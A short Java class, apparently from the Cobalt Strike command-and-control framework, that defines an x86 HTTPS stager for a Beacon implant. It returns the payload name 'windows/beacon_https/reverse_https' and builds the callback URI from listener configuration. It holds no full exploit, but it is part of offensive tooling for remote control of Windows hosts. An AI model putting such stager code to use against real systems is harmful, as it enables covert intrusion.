package stagers;

import common.ScListener;

public class BeaconHTTPSStagerX86 extends GenericHTTPSStagerX86 {
    public BeaconHTTPSStagerX86(ScListener scListener) {
        super(scListener);
    }

    public String payload() {
        return "windows/beacon_https/reverse_https";
    }

    public String getURI() {
        return getConfig().getURI() + getConfig().getQueryString();
    }
}
